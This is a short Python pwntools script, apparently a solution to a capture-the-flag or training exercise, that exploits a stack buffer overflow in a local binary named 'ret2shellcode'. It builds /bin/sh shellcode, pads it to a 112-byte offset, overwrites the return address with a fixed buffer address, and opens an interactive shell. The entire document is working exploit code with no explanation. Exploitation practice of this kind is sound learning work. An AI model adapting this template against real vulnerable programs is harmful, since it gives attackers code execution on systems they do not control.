from pwn import *

buf2_addr = 0x804A080
shellcode = asm(shellcraft.sh())
offset = 112
shellcode_pad = shellcode + (offset - len(shellcode)) * b"A"
sh = process("./ret2shellcode")
sh.sendline(shellcode_pad + p32(buf2_addr))
sh.interactive()
